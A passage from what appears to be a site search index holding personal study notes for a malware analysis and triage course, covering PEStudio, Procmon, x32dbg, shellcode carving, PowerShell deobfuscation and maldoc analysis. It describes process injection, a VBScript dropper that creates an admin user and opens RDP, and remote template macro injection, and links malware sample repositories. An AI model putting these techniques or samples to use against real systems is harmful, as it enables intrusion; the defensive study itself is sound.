Report"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#writing-yara-rules","title":"Writing YARA Rules","text":"<p>Lab File(s)</p> <p>YARA Documentation</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#detecting-malware-with-yara","title":"Detecting Malware with YARA","text":"<p>Lab File(s)</p> <p>Errata YARA is now invoked with the command <code>yara64</code> in the newer version of FLARE-VM. If you can't run YARA by running <code>yara32</code>, try <code>yara64</code> instead!</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#writing-publishing-a-malware-analysis-report","title":"Writing &amp; Publishing a Malware Analysis Report","text":"<p>Report Template</p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#mindmaps","title":"mindmaps","text":""},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#additional-resources","title":"Additional resources","text":"<ul> <li>SANS Malware Analysis and Reverse-Engineering Cheat Sheet click to open PDF in new tab</li> <li>fareedfauzi</li> <li>Malware Analysis - Exploit Notes</li> <li>Malware Static Analysis</li> <li>Reverse Engineering / Binary Exploitation Cheat Sheet</li> <li>Cheatsheet: Windows Malware Analysis and Reversing</li> </ul>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage_Summary/","title":"Practical Malware Analysis and Triage Summary","text":""},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage_Summary/#tools-list","title":"Tools list","text":"FLARE-VM REMnux"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage_Summary/#flare-vm-tool-list","title":"FLARE-VM Tool List","text":"<ul> <li>strings/FLOSS</li> <li>PEView</li> <li>upx (not used but referenced)</li> <li>PEStudio</li> <li>Capa</li> <li>Wireshark</li> <li>Sysinternals (Procmon, TCPView) | Download sysinternals all</li> <li>nc/ncat</li> <li>Cutter</li> <li>x32/x64dbg</li> <li>Process Hacker 2 (now known as System Informer)</li> <li>scdbg</li> <li>dnSpy/dnSpyEx</li> <li>PEBear</li> <li>YARA</li> </ul>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage_Summary/#remnux-tool-list","title":"REMnux Tool List","text":"<ul> <li>base64 (built in Linux bin)</li> <li>OLEdump</li> <li>MobSF github | (Docker Container)</li> <li>INetSim</li> </ul>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage_Summary/#get-your-malware-samples-here","title":"Get your Malware Samples here","text":"<ul> <li>PMAT Labs</li> <li>theZoo</li> <li>vx-underground main site</li> <li>vx-underground GitHub repo</li> <li>Zeltser Resources</li> <li>MalwareBazaar</li> </ul>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage_Summary/#basic-static-analysis","title":"Basic Static Analysis","text":"<p>Basic: Limited Triage approach to the tools and techniques we are using</p> <p>Static: Not running the binary</p> Binary Hashes Binary strings Portable Executable Viewer - PEView Portable Executable Studio - PEStudio Detecting executable capabilities"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage_Summary/#pulling-the-binary-hashes","title":"Pulling the Binary Hashes","text":"<p>Pull the file hashes (Sha256 and MD5)</p> <pre><code>sha256sum.exe &lt;Malware_file_name.extension&gt;\nmd5sum.exe &lt;Malware_file_name.extension&gt;\n</code></pre> <p>If using Cmder</p> <pre><code>Get-filehash -Algorithm SHA256 &lt;Malware_file_name.extension&gt;\n</code></pre> <p>Submit the hashes to VirusTotal and see if you get something promising back!</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage_Summary/#strings","title":"strings","text":"<p>Extract the Binary strings, you can use strings or FLOSS. Floss will pull any array of Char &gt; len(4) and terminated with a NullByte</p> <pre><code>floss &lt;Malware_file_name.extension&gt;\n\n#-n will look for a minimum string length of 8, you can change the value based on your needs.\nfloss -n 8 &lt;Malware_file_name.extension&gt;\n</code></pre> <p>Look through the output for any usable information, one of the most telling is the FLOSS static Unicode strings. Keep in mind that someone could put that there in purpose to mislead you while Analyzing the Malware sample.</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage_Summary/#peview","title":"PEView","text":"<p>run PEView &gt; folder browser select \"All File (.)\" &gt; locate your Malware sample &gt; Click Open &gt; It should load your Malware into the program</p> <p>pFile column: the offset of the Bytes, where in relation to the beginning of the Program did these Bits exist</p> <p>Value column: Char representation of the Bytes. Value MZ is a Windows EXE (Magic Byte tells what the file signature is)</p> <p>If you want to learn more about Magic Bytes</p> <p>Interesting way of abusing the Magic Byte</p> <p>IMAGE_MT_HEADERS &gt; IMAGE_FILE_HEADER &gt; Time Date Stamp - This is the time of build but sometimes this can be incorrect. - If the program was compiled with borland delphi compiler, the compile date will always be 1992</p> <p>IMAGE_SECTION_HEADER.text - Virtual Size (The amount of the data on disk when the Binary is run) &amp; Size of Raw Data ** - Compare these HEX value using calc HEX - If the Size of Raw Data ** &lt; Virtual Size this could mean it's a packed Binary   - In packed Binary the difference is very significant   - </p> <p>SECTION.rdata &gt; IMPORT_Address_Table</p> <p>This section is important because of the Windows API (Application Programming Interface) - APIs are readily accessible to C and C++ developers, other languages like C# and Rust require wrappers or bindings in order to access these APIs. Source Windows Developer Blog - making win32 apis more accessible - What this means is that Malware creators can also make use of the Windows API. - Windows win32 API</p> <p></p> <p>Going back to the IMPORT_Address_Table</p> <p>For example if we see ShellExecuteW, we can google for \"Windows API Shell ExecuteW\", first link gets us to nf-shellapi-shellexecutea which will explain the API call function.</p> <p>Now if you want to get to the point and see exactly what could be malicious, you can check MalAPI.io</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage_Summary/#unpacked-malware","title":"unpacked Malware","text":"<p>You can see all the Windows API Calls under the Value column for IMPORT_Address_Table</p> <p> </p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage_Summary/#packed-malware","title":"packed Malware","text":"<p>You will see the packer name UPX in this case <code>SECTION UPX</code> You won't see all the Windows API calls under the Value column for IMPORT_Address_Table LoadLibraryA &amp; GetProcAddress are used to identify other imports at runtime, on runtime it will go find the API calls from the dlls it loads in.</p> <p></p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage_Summary/#pestudio","title":"PEStudio","text":"<p>Before we get into it, always keep in mind the type of application and it's functionality when looking for file signatures. In below example you can see ShellExecuteA but the application is putty, which is a part of its functionality.</p> <p></p> <p>Run PEStudio &gt; file &gt; open file &gt; select the malware sample &gt; click Open</p> <p>PEStudio simplifies the early stages, when using Basic Static Analysis. For example it gives you the hashes right away, runs strings and presents many more pieces of information.</p> <p></p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage_Summary/#capa","title":"CAPA","text":"<p>CAPA detects malicious capabilities in suspicious programs by using a set of rules. Capa has a default rule set, but also has an open-source repository of rules CAPA rule repository</p> <p></p> <p></p> <p>From the output we can then use the MITRE ATT&amp;CK Framework. In our example we have T1129, we can check that out through this link MITRE T1129</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage_Summary/#basic-dynamic-analysis","title":"Basic Dynamic Analysis","text":"<p>Also known as Heuristic or Behavioral Analysis. Dynamic Analysis means that we will execute/run the Malware and Analyze it.</p> <p>We will be looking for Host Indicators (Like deleting a local file) &amp; Network Indicators (like calling out to the Internet to download a file).</p> Network Signatures Local Signatures TCP View Process Tree Encoded files"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage_Summary/#hunting-for-network-signatures","title":"Hunting for Network Signatures","text":"<p>Make sure all the tools are ready before executing the Malware (RemNux, Wireshark Capture on RemNux)</p> <p>We can start by looking for the Network Signatures now, based on the Static Analysis we did, we gathered possibly a domain name or a file name it's calling for. We can look for those into our Wireshark Capture.</p> <p>Once Network Signatures is complete, we can rollback out VM then run the Malware again to check for Local Signatures.</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage_Summary/#local-signatures-procmon","title":"Local Signatures - Procmon","text":"Procmon overview Procmon common filters"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage_Summary/#overview","title":"overview","text":"<p>Open Procmon &gt; Click the Filter &gt; setup the filter and click OK</p> <p></p> <p>Since we know the process name we can setup something like this</p> <p></p> <p>You won't see any events until you run the Malware sample</p> <p></p> <p>You will now need to sift through the Operations </p> <p>For example in the Static Analysis Stage we found a path with an exe name when we ran strings on the sample, after filtering through operations we found the same path</p> <p></p> <p>Now we can go to that path and see what that executable is doing.</p> <p>Keep going through all the interesting strings to gather more information, try to extract the Malware flow such as if it deletes itself, call to download a file and so on.</p> <p></p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage_Summary/#procmon-filters","title":"procmon filters","text":"<p>Common Operations filters:</p> <ul> <li>CreateFile: When a process wants to create a file.</li> <li>WriteFile: When a process writes data to a file.</li> <li>SetRenameInformationFile: When a rename operation occurs on a file.</li> <li>SetDispositionInformationFile: When a file deletion occurs on a file.</li> <li>RegCreateKey: When registry key is created.</li> <li>RegSetValue: When the data for value is set in the registry</li> <li>RegDeleteKey: When a key gets deleted from the registry.</li> <li>RegDeleteValue: When a value gets deleted from the registry.</li> <li>TCP Connect, TCP Receive, UDP Send, UDP Receive: Process is Sending / - Receiving a TCP or UDP connection.</li> <li>Load Image: When a process loads any DLL\u2019s / Executables.</li> <li>Process Create: When a process creates a process.</li> <li>CreatePipe: When a process creates a Pipe.</li> </ul> <p>Resources:</p> <ul> <li>motiba</li> <li>system_monitor</li> <li>Lonebear69 filter import</li> <li>mindmap</li> </ul>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage_Summary/#tcp-view","title":"TCP View","text":"<p>Having TCP View running when we run the malware sample, we can then check the ports the malware is requesting.</p> <p></p> <p>If we see one that's listening, we can go back to our RemNux machine and netcat <code>nc</code> that port to interact with the Malware and see what happens</p> <p></p> <p>nc result</p> <p></p> <p>decode the result with base64</p> <p></p> <p>Now we know what it's asking for, a command. We ran the <code>ipconfig</code> and came back with a result</p> <p></p> <p>decoded the result and it's showing us the network adapter configuration</p> <p></p> <p>So the above tells us it had command injection capability</p> <p>We now can run procmon while interacting with the Malware sample</p> <p></p> <p>We can see that it's sending the results back</p> <p></p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage_Summary/#process-tree","title":"Process Tree","text":"<p>You will need to de-chain/decouple the Parent Child Process relationship.</p> <p></p> <p>Knowing the PID for the parent process, we can now filter Procmon using Parent PID</p> <p></p> <p></p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage_Summary/#extracting-encoded-file","title":"Extracting encoded file","text":"<p>Lets say you found a base64 string in a command running through powershell.exe</p> <p></p> <p>You can extract that string and decode it, then get the file type of whatever it decoded to</p> <p></p> <pre><code>#decode to a file called out and has no file extension\necho \"XXX_VALUE_XXX\" | base64 -d &gt; out\n\n#figure out the file type\nfile out\n\n#we can see in the example we have a gzip file\n#now you can extract the file and check its contents\n</code></pre>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage_Summary/#advanced-static-analysis-assembly-language-decompiling-disassembling-malware","title":"Advanced Static Analysis: Assembly Language, Decompiling, &amp; Disassembling Malware","text":"Analysis &amp; Assembly Disassembling &amp; Decompiling x86 CPU Assembly Instructions &amp; Windows API Under a Microscope Advanced Analysis of a Process Injector"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage_Summary/#advanced-analysis-assembly-language","title":"Advanced Analysis &amp; Assembly Language","text":""},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage_Summary/#disassembling-decompiling-a-malware-dropper-intro-to-cutter","title":"Disassembling &amp; Decompiling a Malware Dropper: Intro to Cutter","text":"<p>Sample for this section: Lab file(s)</p> <p>Lab file(s)</p> <p>Errata Please note that, depending on when you installed FLARE-VM, the installed tools may or may not include Cutter. If you don't see it when searching in the task bar, please download it from the official site here: https://cutter.re/</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage_Summary/#x86-cpu-instructions-memory-registers-the-stack","title":"x86 CPU Instructions, Memory Registers, &amp; the Stack","text":""},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage_Summary/#dropper-assembly-instructions-and-the-windows-api","title":"Dropper: Assembly Instructions and the Windows API","text":"<p>Sample for this section: Lab file(s)</p> <p>Lab file(s)</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage_Summary/#hello-world-under-a-microscope-part-i","title":"Hello, World! Under a Microscope Part I","text":"<p>Using cutter &gt; load the malware sample in Now we need to see if the application was stripped of it's debug symbols or not, look for the dbg prefix for functions</p> <p></p> <p>You can also lookup the Disassembly </p> <p>rdata is only used to hold readonly data inside a binary</p> <p></p> <p>Checking Hexdump</p> <p></p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage_Summary/#advanced-analysis-of-a-process-injector","title":"Advanced Analysis of a Process Injector","text":"<p>Malware that creates remote thread process Injection is common TTP (Tactics, Techniques, and Procedures)</p> <p>Process Injection: Open up another process that is running on the host and inject code right into that process and have that code run in that process as if that code was a part of that program in the first place.</p> <p>This isn't very stealthy now a days because defenders look for it.</p> <p>What does it look like?</p> <p>Opening up a process  </p> <p>Next step, same logic, API call and passing parameters</p> <p>Allocating an area in memory with the writes to write into that memory</p> <p></p> <p>Taking the Bytes from the lpBuffer and writing them into that process in the section of memory that we've allocated</p> <p></p> <p>Create remote thread</p> <p></p> <p>Looking at the API call in the last screenshot to see what the ate the parameters that are being passed (1st &amp; 4th)</p> <p>So that would be, 1st is hProcess &amp; 4th is IpStartAddress hProcess has value of edi IpStartAddress has value of esi</p> <p></p> <p>and the value of esi that is being passed is </p> <p>If we check the process in Process Hacker, we see the process used was WerFault.exe. Now if we go inspect the Memory we will see an unusual Protection of RWX</p> <p></p> <p>If we go into that RWX section of WerFault.exe, we will see the actual Bytes of the shell code written into this process</p> <p></p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage_Summary/#advanced-dynamic-analysis-debugging-malware","title":"Advanced Dynamic Analysis: Debugging Malware","text":"Flow Control &amp; Breakpoints Dynamic Analysis of x86 Under a Microscope"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage_Summary/#x32dbg-flow-control-breakpoints","title":"x32dbg: Flow Control &amp; Breakpoints","text":"<p>We will be using Debuggers (x32dbg &amp; x64dbg)</p> <p>Load the Malware sample into x32dbg</p> <p>The CPU window shows the Assembly instructions that the program will execute Memory window shows the Memory Registers Stack windows shows any value that was pushed or popped from the stack</p> <p></p> Shortcut Description F2 Breakpoint F9 Run CTRL+F2 Restart F7 Step into F8 Step over CTRL+G Go to memory location"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage_Summary/#debugging-the-dropper-dynamic-analysis-of-x86-instructions-api-calls","title":"Debugging the Dropper: Dynamic Analysis of x86 Instructions &amp; API Calls","text":"<p>load the sample in x32dbg and run the program Keep hitting F8 until it hangs for a bit somewhere, that's where we start tracing</p> <p>On that hang point, set a breakpoint using F2</p> <p>We can also right-click &gt; Follow in Disassembler &gt; choose the location</p> <p></p> <p>If we followed it, it will show the following. You can see a call to the Windows API InternetOpenW</p> <p>We can also see the user agent being utilized for the Windows API call for InternetOpenW</p> <p></p> <p>We can do side by side Analysis, load up Cutter and open the same sample.</p> <p>Locate the same API aall and set them side by side to compare</p> <p></p> <p>Make sure inetsim is running and then open up Wireshark to run a capture.</p> <p>F7 step into the push one by one until we get to the actual API call and Wireshark is capturing any activity on the side.</p> <p></p> <p></p> <p>When the program jumps into the actual call it will process the actual call, keep going until it gets out.</p> <p>Keep doing this until the next call and so on...</p> <p>After the download API we see <code>test eax,eax</code>, this is basically comparing eax to itself to see if the result is zero, we can see EAX is <code>00000000</code> therefor the ZF flag is set to 1.</p> <p>All of this is to confirm if the returned value of the download was good</p> <p></p> <p>Next is jne [jump if not zero], in this case the ZF is 1 so it won't go into that portion. If we want to see what the jne does, we can manually change the ZF value from <code>1</code> to <code>0</code></p> <p></p> <p>We reached a ShellExecute, now we can open procmon at the same time and filter for DownloadFromURL and step in and see what's going on</p> <p></p> <p>F8 until we get the Download File call, locate the file on the file system</p> <p></p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage_Summary/#hello-world-under-a-microscope-part-ii","title":"Hello, World! Under a Microscope Part II","text":"<p>Another way of starting the debugging is by loading the sample into cutter and getting the memory address of the main function so then we can use that to start with in x32dbg</p> <p>Cutter main function memory location</p> <p></p> <p>x32dbg start with memory location</p> <p>In x32dbg CTRL+G and paste the memory location then click OK</p> <p></p> <p>Now we are at the main function, we then set a breakpoint to the memory location and the printf</p> <p></p> <p>Start with F9 and hit it until you get to the breakpoint.</p> <p>So because it's located in memory we can watch our registers as the instructions take place. If you follow in Disassembler you will be brought to the instruction point where we return after this functions returns</p> <p></p> <p>x32dbg anywhere there is an instruction that will act on one of the registers the debugger will highlight that for us</p> <p></p> <p></p> <p>Move the value to esp, but before it moved we can actually edit the value being sent over</p> <p></p> <p>To edit what's being printed out, we need to know how many bytes we are changing. In this case \"Hello, World!\" is 13 Bytes</p> <p></p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage_Summary/#sikomode","title":"SikoMode","text":"<p>SikoMode Lab</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage_Summary/#binary-patching-anti-analysis","title":"Binary Patching &amp; Anti-analysis","text":"Setting Up Anti-analysis Techniques"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage_Summary/#setting-up","title":"Setting Up","text":"<p>Make a copy of the binary and open it in cutter \"Load in write mode\"</p> <p></p> <p>open the main() function in the Decompiler panel</p> <p>Now we need to find a way of tricking the Malware, so in case of a function that calls to exit if cannot reach a website or check something. We can change the jne (jump if not equal) instruction to je (jump if equal), then we save it as a new binary to run.</p> <p></p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage_Summary/#identifying-defeating-anti-analysis-techniques","title":"Identifying &amp; Defeating Anti-analysis Techniques","text":"<p>simpleAntiAnalysis Lab</p> <p>All of these techniques belong to the Defense Evasion tactic:</p> <ul> <li>Virtualization/Sandbox Evasion</li> <li>Debugger Evasion</li> <li>Execution Guardrails</li> </ul>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage_Summary/#gone-phishing-maldoc-analysis","title":"Gone Phishing: Maldoc Analysis","text":"OLEdump Remote Template Macro Injection"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage_Summary/#analyzing-excel-maldocs-oledump","title":"Analyzing Excel Maldocs: OLEdump","text":"<p>Gone Phishing Excel Lab</p> <p>We can just use Remnux for this one</p> <pre><code>#unzip the excel sheet\nunzip xxxx.xlsm\n</code></pre> <p></p> <pre><code>cd xl\ncat vbaProject.bin\n#now we will get teh raw bits for this bin\n\n#we can use oledump.py for this\noledump.py xxxx.xlsm\n</code></pre> <p>The As are indexes of data streams that were identified by oledump The M is Macro inside that data stream</p> <p></p> <p>Now we can choose one of those Indexes that we want to dig in</p> <pre><code>oledump.py -s 3 xxx.xlsm\n</code></pre> <p>This will show us the HEXDump</p> <p></p> <pre><code>#Instead to make it easier, we will do capital S for Strings\noledump.py -s 3 -S xxx.xlsm\n</code></pre> <p></p> <pre><code>#Attempt to recover the Macro\noledump.py -s 3 --vbadecompresscorrupt xxx.xlsm\n</code></pre> <p></p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage_Summary/#analyzing-word-maldocs-remote-template-macro-injection","title":"Analyzing Word Maldocs: Remote Template Macro Injection","text":"<p>Gone Phishing Word Lab</p> <p>docm &gt; Macro enabled document docx &gt; Can contain Macros</p> <p></p> <pre><code>oledump.py xxx.docm\n</code></pre> <p></p> <p>This sample has the same vba in the excel example, so from here on now is the same as the previous example.</p> <p>The rels is something you will find in polished documents</p> <p></p> <p>What this file looks like</p> <p></p> <p>The document when it loads, it will go to the link to download the polished document. You can put a link to a Macro and once it pull sit, it will execute it.</p> <p></p> <p></p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage_Summary/#what-the-shell-shellcode-analysis","title":"What The Shell? Shellcode Analysis","text":"Carving Shellcode &amp; scdbg Memory Shellcode"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage_Summary/#analyzing-shellcode-carving-shellcode-scdbg","title":"Analyzing Shellcode: Carving Shellcode &amp; scdbg","text":"<p>Carve from text Lab</p> <p>Note: scdbg is available Here if it is not installed in FLARE-VM </p> <p></p> <p>0xfc in C# 0x denotes a Hex Bytes, the following 2 alpha numeric characters represented for the Hex Bytes (the actual data of the Hex Byte)</p> <p>We will extract that value from the original C# code and put it into a txt file.</p> <p></p> <p>We will create a Python carver to clean up the txt file Hex, name it <code>carver.py</code></p> <pre><code>#python carver\n#!/user/bin/env python3\nwith open(\"xx.txt\",\"r\") as f:\n        hex_string = f.read().replace(\"0x\",\"\").replace(\"byte[] rsrc = new byte[464] {\",\"\").replace(\" };\",\"\").replace(\",\",\"\")\n        hex_encode = hex_string.encode()\nprint(hex_string)\nprint(hex_encode)\n</code></pre> <p>we can test this out <code>python3 carver.py</code> check the results, if looks good we will get back to make some updates to our script</p> <pre><code>#python carver\n#!/user/bin/env python3\nwith open(\"xx.txt\",\"r\") as f:\n        hex_string = f.read().replace(\"0x\",\"\").replace(\"byte[] rsrc = new byte[464] {\",\"\").replace(\" };\",\"\").replace(\",\",\"\")\n        hex_encode = hex_string.encode()\n\nwith open (\"out.bin\",\"wb\") as out\n    out.write(hex_encode)\n</code></pre> <p><code>python3 carver.py</code></p> <p><code>cat out.bin</code></p> <p></p> <p>We will now move this out.bin to FLare-vm</p> <p></p> <pre><code>#we will use shell code debug\nscdbg /f out.bin -s -1\n</code></pre> <p><code>scdbg</code> will resolve all steps without running the malware sample</p> <p></p> <p>We can see what it's calling</p> <p></p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage_Summary/#carving-shellcode-from-memory","title":"Carving Shellcode from Memory","text":"<p>Carving from Memory Lab</p> <p>Addendum: Find the exact size of the shellcode If I'm feeling lazy, I will usually copy contiguous bytes from memory until I hit a bunch of null bytes (\\x00), which is usually good enough. However, there are more scientific ways to get the exact size of the shellcode so we know exactly how much we need to copy out of memory.</p> <p>In this example, the size of the buffer that the program is injecting is known and used elsewhere during the injection routine. For example, the VirtualAllocEx call is executed before the WriteProcessMemoryEx call. VirtualAllocEx sets up the section of memory and changes the RWX permissions so the shellcode is executable.</p> <p>According to the documentation, VirtualAllocEx takes in four parameters. The third parameter is the dwSize parameter, which is the size of the buffer in bytes:</p> <p>[in] dwSize: <code>The size of the region of memory to allocate, in bytes.</code></p> <p>If we locate the VirtualAllocEx call, which is right before WriteProcessMemory, and set a breakpoint on the third parameter that is moved into the registers before it is called, we see that it moves a value from RDX into R8 to set up for that call. If we look at RDX when the move takes place, it's the hex value <code>0x01D1</code>, which corresponds to the decimal value 465, so we know the shellcode is 465 bytes. Then, do some memory address hex math and you know where to start and where to end.</p> <p>If we load the sample into <code>pestudio</code> we will see the Win API Calls, we want to debug just before it writes to memory.</p> <p></p> <p>Load the sample int <code>Cutter</code>, we can see that we do not have any Debug symbols, so this is going to make it a bit harder to analyze.</p> <p></p> <p>What we can do, is start from the end of the program, find the last place a function returned something into the <code>EAX</code></p> <p>enterypoint =&gt; CRT (preamble to run this program) =&gt; main - so what this means, when the program runs, the entrypoint is the first thing calls, however, it isn't the main function. - The entrypoint sets up the CRT - C Run Time, in CRT the last thing that happens is a call to the main function. - If we do this in reverse, the last thing that was called, is going to return from main function into the CRT. - SO basically, we need to look al the last thing that was called into CRT.</p> <p>So now we will load the <code>graph</code> view and go all the way to the bottom and start from there</p> <p></p> <p>Check the <code>EAX</code> dword value that was called, click on the value so it would highlight all the places this value was used</p> <p></p> <p>Looks like last time it was called it was in this section (3rd from bottom). Just before that we see a <code>call</code> function, that function returns the value that will be used in <code>EAX</code>.  There is a chance that this is the actual <code>main</code> function. Double click on that call</p> <p></p> <p>Now we are in that function</p> <p></p> <p>Lets rename the function, right click &gt; <code>Re-type Local Variable</code></p> <p></p> <p>Name it main and click ok</p> <p></p> <p>We will start with the last call in <code>main</code>, double click it to load the function</p> <p></p> <p>If we then scroll down and look at the call, we will see the Win API Calls</p> <p></p> <p>Now since we know which calls are being made through <code>cutter</code>, we can just take the memory location for the function. The one we want to dig in, will be the <code>WriteProcessMemory</code></p> <p></p> <p>Now open the sample in <code>x64dbg', navigate to the CPU section and</code>CTRL + G` then paste the memory value</p> <p></p> <p>Click F2 to set a breakpoint on the <code>WriteProcessMemory</code> Win API Call</p> <p></p> <p>If we check what the API documentation, we can see what it takes and what it outputs</p> <p></p> <p>The one we are intrested in is the <code>lpBuffer</code>, this is where the Malware is trying to inject itself into</p> <p></p> <p>Set the breakpoint on the call itself now</p> <p></p> <p>If we actually look back to see the parameters passed to the API, we can see the lpBuffer value is the <code>r8,rcx</code></p> <p></p> <p>Right click the lpBuffer value <code>r8,rcx</code> &gt; Follow in Dump &gt; select the r8</p> <p></p> <p>We can see the shell Bytes</p> <p></p> <p>Highlight all the shell Bytes &gt; right click &gt; Binary &gt; Save To a File</p> <p></p> <p>Save it to dump.bin</p> <p></p> <p>We can now open a Hex Editor like <code>HxD</code> then load the Binary into it</p> <p></p> <p>The better tool to use would be shell code debug <code>scdbg</code>, open a shell session and type the following</p> <pre><code>scdbg /f .\\dump.bin /s -1 \n</code></pre> <p>Now we can see all the Win API Calls</p> <p></p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage_Summary/#off-script-scripted-malware-delivery-mechanisms","title":"Off-Script: Scripted Malware Delivery Mechanisms","text":"PowerShell VBScript HTML Applications (HTA)"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage_Summary/#powershell-analyzing-obfuscated-scripts","title":"PowerShell: Analyzing Obfuscated Scripts","text":"<p>PowerShell Lab</p> <p>Powershell is an interpreter for the .Net Framework</p> <p>Arm the sample and loaded it in vsCode &gt; <code>ALT + Z</code> to word wrap</p> <p>So this sample is converting Base64 into a String, it then will decompress the String. The output will then be passed into the 2nd phase of Encoding to ACII</p> <p></p> <p>So lets defang the sample by taking out the Invoke Expression <code>iEx(</code> and the last bracket <code>)</code>, now we can assign the remianing to a variable</p> <p></p> <p>Open a shell session and declare your variable <code>$megasus =</code> then paste the value you copied previously, the defanged script</p> <p></p> <p></p> <p>So instead of Invoking the expression and have it do its thing, we will do the following</p> <pre><code>write-host $megasus\n#hit enter\n</code></pre> <p>Now we can see the Malware script wihtout detonating it, so it decoded and deinflated the sample by doing that.</p> <p></p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage_Summary/#vbscript-analyzing-a-multi-stage-msbuild-dropper","title":"VBScript: Analyzing a Multi-Stage MSBuild Dropper","text":"<p>VBScript Lab</p> <p>The script will decode both cert files and send them to a location, the output files are one.vbs &amp; xml.xml, it will then wait 100 ms and will run one.vbs afterwards.</p> <p></p> <p>If we read the code we will see that it's replacing all vVv with nothing \"\"</p> <p></p> <p>If we do that, now we see what's going on. The GetObject here contains a COM Class (Component Model Object). COM is one of the most abusable features of the Windows OS.</p> <p>This COM is invoking ShellBrowserWindow to run a Shell command, it will do in a hiden window <code>that's the 0 value</code> and it will try to <code>runas</code> Administrator and will run the contents of the <code>xml.xml</code></p> <p></p> <p>We can run the sample to see what it's doing, well in the first run since we didn't run as Admin, nothing happened</p> <p></p> <p>Lets see what happens if we run it as Admin. Creating adding a user to the remote desktop User Group, adding that user to the Administrator's Group then opening up a port on the Firewall to open RDP if not already open up.</p> <p></p> <p>All of that is obfuscated in this Hex</p> <p></p> <p>The user is <code>wdsadmin</code></p> <p></p> <p></p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage_Summary/#html-applications-hta-wrapped-payloads-scripted-delivery-wmi","title":"HTML Applications (HTA): Wrapped Payloads, Scripted Delivery, &amp; WMI","text":"<p>Lab File(s)</p> Introduction The Offensive Potential of HTML JavaScript Is Dangerous Enter, HTML Applications Analyzing HTAs Static Analysis Invoking WMI &amp; Executing PowerShell Dynamic Analysis 